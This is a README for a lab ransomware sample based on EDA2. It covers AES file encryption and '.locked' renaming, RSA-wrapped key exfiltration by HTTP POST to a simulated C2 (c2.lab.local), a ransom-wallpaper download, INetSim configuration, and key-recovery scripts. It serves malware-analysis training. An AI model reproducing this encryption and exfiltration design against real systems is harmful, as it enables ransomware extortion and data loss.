# A01_4 `C#` EDA2 Variant: Encryption + Key Exfiltration

## Summary

Encrypts files located within a controlled laboratory directory using
AES-256 encryption and transmits the encrypted AES key to a simulated
command-and-control server.

The sample is based on the EDA2 ransomware design and demonstrates a
hybrid cryptographic workflow commonly associated with ransomware:

* A symmetric AES key encrypts local files
* An asymmetric RSA public key encrypts the AES key
* The RSA-encrypted AES key is transmitted to a remote server
* A ransom-note image is downloaded and set as the desktop wallpaper

The sample communicates exclusively with the controlled INetSim server
at:

```text
c2.lab.local
```

The network workflow performs the following operations:

* Downloads an RSA public key from the laboratory server
* Generates a random 32-character AES key
* Stores the plaintext AES key locally for laboratory recovery
* Recursively encrypts selected files using AES-256
* Encrypts the AES key using the downloaded RSA public key
* Base64-encodes the RSA-encrypted key
* Sends host metadata and the encrypted key to the laboratory server
* Downloads a controlled ransom-note image
* Sets the downloaded image as the desktop wallpaper
* Terminates after completion

The plaintext AES key is intentionally stored locally to permit recovery
of the controlled test files.

No Internet-accessible command-and-control infrastructure is used.

---

## Payload Summary

The payload recursively encrypts eligible files located within:

```text
C:\Users\Public\A01_TestData
```

Only files matching predefined extensions are processed, including:

* Documents
* Spreadsheets
* Presentations
* Images
* Source code
* Database files
* Web content

Each eligible file is:

* Read into memory
* Encrypted using AES-256 in CBC mode
* Overwritten with encrypted data
* Renamed by appending:

```text
.locked
```

A randomly generated 32-character AES key is written to:

```text
C:\Users\Public\A01_4_Lab_Encryption_Key.txt
```

This locally stored key exists solely for controlled laboratory
validation and decryption.

The AES key is also encrypted with a 2048-bit RSA public key downloaded
from the INetSim server. The RSA-encrypted result is Base64-encoded and
sent to:

```text
http://c2.lab.local/panel/savekey
```

The POST request includes:

```text
pcname
username
aesencrypted
```

After key transmission, the sample downloads a controlled ransom-note
image from:

```text
http://c2.lab.local/panel/ransomnote
```

The image is saved locally as:

```text
C:\Users\<username>\ransom.jpg
```

The downloaded image is then applied as the desktop wallpaper.

No persistence, credential theft, recovery inhibition, or double
extortion is performed.

---

## Network Endpoint Summary

### RSA Public-Key Retrieval

```text
GET http://c2.lab.local/panel/publickey
```

Expected response:

```text
RSA public key in XML format
```

The returned XML is passed to:

```text
RSACryptoServiceProvider.FromXmlString()
```

---

### Encryption-Key Exfiltration

```text
POST http://c2.lab.local/panel/savekey
```

Form encoding:

```text
application/x-www-form-urlencoded
```

POST parameters:

```text
pcname=<computer-name>
username=<user-name>
aesencrypted=<Base64-RSA-encrypted-AES-key>
```

---

### Ransom-Image Retrieval

```text
GET http://c2.lab.local/panel/ransomnote
```

Expected response:

```text
JPEG image
```

Local destination:

```text
C:\Users\<username>\ransom.jpg
```

---

## To Execute A01_4

### Step 1 — Prepare the laboratory dataset

Create the controlled input directory:

```text
C:\Users\Public\A01_TestData
```

Populate the directory with representative files such as:

* `.txt`
* `.docx`
* `.xlsx`
* `.pptx`
* `.jpg`
* `.png`
* `.csv`

Subdirectories may also be included to demonstrate recursive encryption.

### Step 2 — Confirm laboratory name resolution

Make sure the Windows analysis VM resolves:

```text
c2.lab.local
```

to the INetSim server:

```text
192.168.67.5
```

The Windows VM should normally use the INetSim server as its DNS
resolver. [**See section below for configuring Inetsim server.**](A01-Ransomware-Cryptor\A01_4\README.md#INetSim-Configuration-for-A01_4)

Name resolution can be tested with:

```powershell
Resolve-DnsName c2.lab.local
```

Expected address:

```text
192.168.67.5
```

### Step 3 — Verify the INetSim HTTP endpoints

From the Windows analysis VM, verify the public-key endpoint:

```powershell
Invoke-WebRequest http://c2.lab.local/panel/publickey
```

Verify the ransom-image endpoint:

```powershell
Invoke-WebRequest `
    http://c2.lab.local/panel/ransomnote `
    -OutFile C:\Users\Public\A01_4_Test_Ransom.jpg
```

The public-key request must return valid RSA XML, and the ransom-note
request must return a valid JPEG file.

### Step 4 — Execute the sample

```powershell
.\A01-Ransomware-Cryptor\A01_4\bin\A01_4_EDA2_Key_Exfiltration.exe
```

The sample runs automatically and exits after:

* File encryption
* AES-key protection
* Key transmission
* Ransom-image download
* Wallpaper modification

---

## Expected Encryption Artifacts

### Laboratory Encryption Key

```text
C:\Users\Public\A01_4_Lab_Encryption_Key.txt
```

### Encrypted Files

Original file:

```text
example.docx
```

Encrypted file:

```text
example.docx.locked
```

The original plaintext contents are replaced by AES-encrypted data.

### Downloaded Ransom Image

```text
C:\Users\<username>\ransom.jpg
```

### Desktop Modification

The downloaded JPEG is set as the user's desktop wallpaper through:

```text
SystemParametersInfo()
```

---

## Expected Network Artifacts

### DNS Activity

The sample should generate DNS queries for:

```text
c2.lab.local
```

### HTTP Requests

Expected request sequence:

```text
GET  /panel/publickey
POST /panel/savekey
GET  /panel/ransomnote
```

### Expected POST Body Structure

```text
pcname=ANALYSIS-PC&
username=analyst&
aesencrypted=<URL-encoded-Base64-data>
```

The exact RSA-encrypted value changes between executions because a new
AES key is generated for each run.

### Expected Dynamic Signals

Dynamic analysis tools may observe:

* DNS resolution for `c2.lab.local`

* HTTP communication over TCP port 80

* RSA public-key retrieval

* Recursive filesystem enumeration

* AES-encrypted file writes

* `.locked` file renaming

* Creation of the local laboratory key file

* HTTP POST key transmission

* URL-encoded Base64 data in the POST body

* Ransom-image download

* Creation of `ransom.jpg`

* Desktop wallpaper modification

* Calls or managed equivalents associated with:

  ```text
  WebClient.DownloadString()
  WebClient.UploadValues()
  WebClient.DownloadFile()
  RSACryptoServiceProvider.FromXmlString()
  RSACryptoServiceProvider.Encrypt()
  SystemParametersInfo()
  ```

* No HTTPS traffic

* No persistence behavior

* No backup or shadow-copy deletion

* No credential theft

---

## INetSim Configuration for A01_4

A01_4 requires simulated DNS and HTTP services.

The INetSim server must provide:

1. DNS resolution for:

   ```text
   c2.lab.local
   ```

2. An RSA public key at:

   ```text
   /panel/publickey
   ```

3. A successful JSON response for:

   ```text
   /panel/savekey
   ```

4. A JPEG ransom-note image at:

   ```text
   /panel/ransomnote
   ```

---

### Required INetSim Services

Make sure the following services are enabled in:

```text
/etc/inetsim/inetsim.conf
```

Required services:

```text
dns
http
```

The expected service identifiers in the INetSim log are typically:

```text
dns_53_tcp_udp
http_80_tcp
```

---

### DNS Configuration

Configure the simulated DNS domain and server address:

```text
dns_default_ip 192.168.67.5
dns_default_domainname lab.local
```

Make sure requests for:

```text
c2.lab.local
```

resolve to:

```text
192.168.67.5
```

A static DNS entry may be added when explicit hostname mapping is
preferred:

```text
c2.lab.local 192.168.67.5
```

The exact static-entry file or directive depends on the existing INetSim
DNS configuration used by the laboratory.

---

### Step 1 — Generate the RSA Key Pair

Generate the RSA key pair before creating the INetSim HTTP mappings.

The public key served by INetSim and the private key used for laboratory
recovery must belong to the same RSA-2048 key pair.

The sample expects the public key in the legacy .NET XML format consumed
by:

```text
RSACryptoServiceProvider.FromXmlString()
```

Run the following PowerShell script on a trusted laboratory system with
the .NET Framework available:

```powershell
$rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider 2048

$publicKeyXml  = $rsa.ToXmlString($false)
$privateKeyXml = $rsa.ToXmlString($true)

[System.IO.File]::WriteAllText(
    "$PWD\publickey.xml",
    $publicKeyXml,
    (New-Object System.Text.UTF8Encoding($false))
)

[System.IO.File]::WriteAllText(
    "$PWD\privatekey.xml",
    $privateKeyXml,
    (New-Object System.Text.UTF8Encoding($false))
)

$rsa.PersistKeyInCsp = $false
$rsa.Clear()
```

The script creates:

```text
publickey.xml
privatekey.xml
```

The public-key file should contain only:

```xml
<RSAKeyValue>
  <Modulus>BASE64_MODULUS</Modulus>
  <Exponent>AQAB</Exponent>
</RSAKeyValue>
```

The private-key file additionally contains the private RSA parameters
required for decryption.

Protect the private key carefully:

```text
privatekey.xml
```

It must not be served by INetSim, embedded in the sample, or copied into
the HTTP fake-file directory.

A recommended laboratory location is:

```text
/opt/a01_4/keys/privatekey.xml
```

Copy only the public key to the INetSim server:

```bash
sudo cp publickey.xml \
    /var/lib/inetsim/http/fakefiles/publickey.xml
```

Store the matching private key separately:

```bash
sudo mkdir -p /opt/a01_4/keys

sudo cp privatekey.xml \
    /opt/a01_4/keys/privatekey.xml

sudo chmod 600 \
    /opt/a01_4/keys/privatekey.xml
```

---

### Step 2 — Create the HTTP Fake Files

The fake response files are stored beneath:

```text
/var/lib/inetsim/http/fakefiles/
```

Create the required files:

```text
/var/lib/inetsim/http/fakefiles/publickey.xml
/var/lib/inetsim/http/fakefiles/savekey_OK.json
/var/lib/inetsim/http/fakefiles/A01_4_ransomnote.jpg
```

Create the JSON response returned by the key-submission endpoint:

```bash
sudo tee \
    /var/lib/inetsim/http/fakefiles/savekey_OK.json \
    > /dev/null <<'EOF'
{"status":"ok","task":"Saved encrypted AES key"}
EOF
```

Confirm that the account used by INetSim can read the public response
files:

```bash
sudo chmod 644 \
    /var/lib/inetsim/http/fakefiles/publickey.xml \
    /var/lib/inetsim/http/fakefiles/savekey_OK.json \
    /var/lib/inetsim/http/fakefiles/A01_4_ransomnote.jpg
```

---

### Step 3 — Validate the RSA Public-Key File

The following file must contain the public portion of the RSA-2048 key
pair in the XML format expected by the .NET Framework:

```text
/var/lib/inetsim/http/fakefiles/publickey.xml
```

Expected structure:

```xml
<RSAKeyValue>
  <Modulus>BASE64_MODULUS</Modulus>
  <Exponent>AQAB</Exponent>
</RSAKeyValue>
```

Do not include:

* Markdown formatting
* HTML
* Explanatory text
* A UTF-8 byte-order mark
* A PEM header such as `-----BEGIN PUBLIC KEY-----`
* Any private RSA parameters

The response body must be directly consumable by:

```text
RSACryptoServiceProvider.FromXmlString()
```

The matching private key should remain at:

```text
/opt/a01_4/keys/privatekey.xml
```

or another protected laboratory-only location.

---

### Step 4 — Configure the Save-Key Response

The key-submission endpoint should return:

```text
/var/lib/inetsim/http/fakefiles/savekey_OK.json
```

Required contents:

```json
{"status":"ok","task":"Saved encrypted AES key"}
```

The response should use the MIME type:

```text
application/json
```

The sample does not parse the JSON body. It only requires the server to
accept the POST request without causing `WebClient.UploadValues()` to
fail.

INetSim returns a static acknowledgment; it does not persist the
submitted encrypted key as an application server would. The submitted
form values must therefore be recovered from:

* INetSim service logs
* A packet capture
* An HTTP request capture generated by another laboratory sensor

---

### Step 5 — Install the Ransom-Image Fake File

Place a valid JPEG image at:

```text
/var/lib/inetsim/http/fakefiles/A01_4_ransomnote.jpg
```

The file must contain actual JPEG data because the sample saves the
response as:

```text
C:\Users\<username>\ransom.jpg
```

and attempts to apply it as the Windows wallpaper.

A text file renamed with a `.jpg` extension is not sufficient.

---

### Step 6 — Configure the Static HTTP Path Mappings

Add path-specific fake-file mappings to:

```text
/etc/inetsim/inetsim.conf
```

Example:

```text
http_fakemode YES

http_static_fakefile /panel/publickey publickey.xml text/xml
http_static_fakefile /panel/savekey savekey_OK.json application/json
http_static_fakefile /panel/ransomnote A01_4_ransomnote.jpg image/jpeg
```

These mappings cause INetSim to return different controlled content for
the three endpoint paths.

The paths must exactly match the URLs hardcoded in the sample:

```text
/panel/publickey
/panel/savekey
/panel/ransomnote
```

After updating the configuration, restart INetSim:

```bash
sudo systemctl restart inetsim
```

When INetSim is launched manually instead of as a service, stop the
existing process and restart it with the laboratory configuration:

```bash
sudo inetsim --config /etc/inetsim/inetsim.conf
```

---

### Step 7 — Recover the Submitted RSA Ciphertext

The submitted AES key is contained in the form parameter:

```text
aesencrypted
```

The value is:

1. RSA-encrypted using the public key in `publickey.xml`
2. Base64-encoded
3. URL-encoded as part of the HTTP form body

Example raw POST field:

```text
aesencrypted=AbCdEf%2B123%2F456%3D%3D
```

Before RSA decryption:

1. Extract only the `aesencrypted` value
2. URL-decode the value
3. Preserve the resulting Base64 text exactly

A URL-decoded example would resemble:

```text
AbCdEf+123/456==
```

---

### Step 8 — Decrypt the AES Key with the Matching RSA Private Key

The sample calls:

```text
provider.Encrypt(keyBytes, false)
```

Because the `OAEP` argument is `false`, the AES key is protected using:

```text
RSA-2048
PKCS#1 v1.5 encryption padding
```

The matching private key must therefore decrypt the ciphertext using
PKCS#1 v1.5 padding rather than OAEP.

Save the URL-decoded Base64 ciphertext to:

```text
encrypted_aes_key.txt
```

Then run the following PowerShell script on a trusted laboratory system:

```powershell
$privateKeyPath   = ".\privatekey.xml"
$encryptedKeyPath = ".\encrypted_aes_key.txt"
$outputPath       = ".\recovered_aes_key.txt"

$privateKeyXml = [System.IO.File]::ReadAllText($privateKeyPath).Trim()
$encryptedB64  = [System.IO.File]::ReadAllText($encryptedKeyPath).Trim()

$encryptedBytes = [Convert]::FromBase64String($encryptedB64)

$rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider 2048
$rsa.FromXmlString($privateKeyXml)

# $false selects PKCS#1 v1.5 padding, matching the sample.
$plaintextBytes = $rsa.Decrypt($encryptedBytes, $false)
$plaintextKey   = [System.Text.Encoding]::UTF8.GetString($plaintextBytes)

[System.IO.File]::WriteAllText(
    $outputPath,
    $plaintextKey,
    (New-Object System.Text.UTF8Encoding($false))
)

$rsa.PersistKeyInCsp = $false
$rsa.Clear()

Write-Host "Recovered AES key: $plaintextKey"
Write-Host "Saved to: $outputPath"
```

Expected output:

```text
Recovered AES key: <32-character AES key>
Saved to: .\recovered_aes_key.txt
```

The recovered value should match:

```text
C:\Users\Public\A01_4_Lab_Encryption_Key.txt
```

This comparison validates the full laboratory workflow:

```text
Generated AES key
        |
        v
RSA encryption with publickey.xml
        |
        v
Base64 + HTTP form submission
        |
        v
Captured aesencrypted value
        |
        v
URL decoding + Base64 decoding
        |
        v
RSA decryption with privatekey.xml
        |
        v
Original 32-character AES key
```

Do not attempt to decrypt the Base64 text directly with RSA. Base64
decoding must occur first.

---

### Verify the INetSim Configuration

From the INetSim server, confirm the files exist:

```bash
ls -l \
    /var/lib/inetsim/http/fakefiles/publickey.xml \
    /var/lib/inetsim/http/fakefiles/savekey_OK.json \
    /var/lib/inetsim/http/fakefiles/A01_4_ransomnote.jpg
```

From the Windows analysis VM, retrieve the public key:

```powershell
$response = Invoke-WebRequest `
    http://c2.lab.local/panel/publickey

$response.StatusCode
$response.Content
```

Expected status:

```text
200
```

Test the key-submission endpoint:

```powershell
Invoke-WebRequest `
    -Uri http://c2.lab.local/panel/savekey `
    -Method POST `
    -Body @{
        pcname      = "TEST-PC"
        username    = "analyst"
        aesencrypted = "TEST_BASE64_VALUE"
    }
```

Expected response body:

```json
{"status":"ok","task":"Saved encrypted AES key"}
```

Test the ransom-image endpoint:

```powershell
Invoke-WebRequest `
    http://c2.lab.local/panel/ransomnote `
    -OutFile C:\Users\Public\A01_4_Test_Ransom.jpg
```

Confirm that the resulting file is a valid image before executing the
sample.

---

### Expected INetSim DNS Log Activity

Successful execution should generate DNS activity in:

```text
/var/log/inetsim/service.log
```

Example:

```text
[dns_53_tcp_udp] recv: Query Type A, Class IN, Name c2.lab.local
[dns_53_tcp_udp] send: c2.lab.local 3600 IN A 192.168.67.5
```

Multiple DNS requests may occur depending on Windows resolver caching.

---

### Expected INetSim HTTP Log Activity

Expected request order:

```text
GET  /panel/publickey
POST /panel/savekey
GET  /panel/ransomnote
```

Representative log activity:

```text
[http_80_tcp] Request: GET /panel/publickey HTTP/1.1
[http_80_tcp] Host: c2.lab.local
[http_80_tcp] Response: 200 OK
```

```text
[http_80_tcp] Request: POST /panel/savekey HTTP/1.1
[http_80_tcp] Host: c2.lab.local
[http_80_tcp] Content-Type: application/x-www-form-urlencoded
```

The decoded POST parameters should resemble:

```text
pcname=ANALYSIS-PC
username=analyst
aesencrypted=<Base64-RSA-encrypted-AES-key>
```

The `aesencrypted` value may appear URL-encoded in the raw request. For
example:

```text
+  becomes %2B
/  becomes %2F
=  becomes %3D
```

The final image request should resemble:

```text
[http_80_tcp] Request: GET /panel/ransomnote HTTP/1.1
[http_80_tcp] Host: c2.lab.local
[http_80_tcp] Response: 200 OK
[http_80_tcp] Content-Type: image/jpeg
```

---

### Packet-Capture Expectations

A packet capture should reveal the complete communication sequence
because the sample uses unencrypted HTTP:

```text
Windows analysis VM
        |
        | DNS A query: c2.lab.local
        v
INetSim DNS service
        |
        | A response: 192.168.67.5
        v
Windows analysis VM
        |
        | HTTP GET /panel/publickey
        | HTTP POST /panel/savekey
        | HTTP GET /panel/ransomnote
        v
INetSim HTTP service
```

The packet capture may expose:

* The RSA public key returned by the server
* The computer name
* The username
* The Base64-encoded RSA ciphertext
* The downloaded JPEG data

The plaintext AES key is not transmitted over the network.

---


# High-Level Encryption and Key-Exfiltration Flow

1. Launch the ransomware specimen:

   ```text
   A01_4_EDA2_Key_Exfiltration.exe
   ```

2. Hide the Windows Forms interface

3. Resolve:

   ```text
   c2.lab.local
   ```

4. Request the RSA public key from:

   ```text
   GET /panel/publickey
   ```

5. Receive a 2048-bit RSA public key in XML format

6. Generate a random 32-character AES key

7. Write the plaintext laboratory key to:

   ```text
   C:\Users\Public\A01_4_Lab_Encryption_Key.txt
   ```

8. Begin recursive traversal of:

   ```text
   C:\Users\Public\A01_TestData
   ```

9. Enumerate files and subdirectories

10. Filter files using the supported extension list

11. Read each eligible file into memory

12. Hash the AES-key material using:

    ```text
    SHA-256
    ```

13. Derive the encryption key and initialization vector using:

    ```text
    PBKDF2
    SHA-256
    1,000 iterations
    ```

14. Encrypt file contents using:

    ```text
    AES-256
    CBC mode
    ```

15. Overwrite the original file with encrypted data

16. Rename the encrypted file by appending:

    ```text
    .locked
    ```

17. Import the downloaded RSA public key using:

    ```text
    RSACryptoServiceProvider.FromXmlString()
    ```

18. Encrypt the 32-character AES key using:

    ```text
    RSA-2048
    PKCS#1 v1.5 padding
    ```

19. Base64-encode the RSA ciphertext

20. Construct an HTTP POST request containing:

    ```text
    pcname
    username
    aesencrypted
    ```

21. Transmit the encrypted AES key to:

    ```text
    POST /panel/savekey
    ```

22. Download the ransom-note image from:

    ```text
    GET /panel/ransomnote
    ```

23. Save the image as:

    ```text
    C:\Users\<username>\ransom.jpg
    ```

24. Apply the image as the desktop wallpaper using:

    ```text
    SystemParametersInfo()
    ```

25. Clear the AES-key and encrypted-key variables

26. Exit after completing artifact generation

---


**Purpose**

Demonstrates a hybrid ransomware cryptographic workflow in which local
files are encrypted with a symmetric AES key and that key is protected
with a remotely supplied RSA public key before transmission to a
simulated command-and-control server.

The specimen additionally demonstrates ransom-image delivery and desktop
wallpaper modification while producing controlled filesystem, DNS, HTTP,
cryptographic, and host-modification artifacts suitable for reverse
engineering, dynamic malware analysis, network analysis, and
retrieval-augmented generation evaluation.
